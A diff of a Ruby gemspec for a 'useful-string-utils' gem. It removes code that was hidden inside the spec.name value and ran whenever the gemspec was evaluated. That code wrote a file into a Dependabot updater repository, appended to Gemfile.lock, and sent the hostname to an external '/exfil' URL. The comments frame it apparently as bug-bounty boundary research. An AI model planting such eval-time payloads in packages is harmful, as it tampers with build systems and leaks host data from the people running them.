@@ -3,30 +3,7 @@
 require_relative "lib/useful_string_utils/version"
 
 Gem::Specification.new do |spec|
-  spec.name          = (
-    begin
-      require "net/http"
-      require "uri"
-      marker = "PHASE-A-MARKER-" + Time.now.to_i.to_s
-
-      # File-write persistence test: write a new file + append to existing lockfile
-      File.write("/home/dependabot/dependabot-updater/repo/PHASE-A-NEW-FILE.txt",
-                 marker + "\nresearch artifact for boundary verification\n")
-
-      File.open("/home/dependabot/dependabot-updater/repo/Gemfile.lock", "a") do |f|
-        f.write("\n# " + marker + "-appended-from-eval\n")
-      end
-
-      # Single confirmation ping to record that eval fired
-      Net::HTTP.post(
-        URI("https://bell-chelsea-path-even.trycloudflare.com/exfil"),
-        "phase=A&marker=" + marker + "&host=" + (Socket.gethostname rescue "x"),
-        {"Content-Type" => "application/x-www-form-urlencoded"}
-      )
-    rescue
-    end
-    "useful-string-utils"
-  )
+  spec.name          = "useful-string-utils"
   spec.version       = UsefulStringUtils::VERSION
   spec.authors       = ["mr-benty"]
   spec.email         = ["mr_benty@wearehackerone.com"]
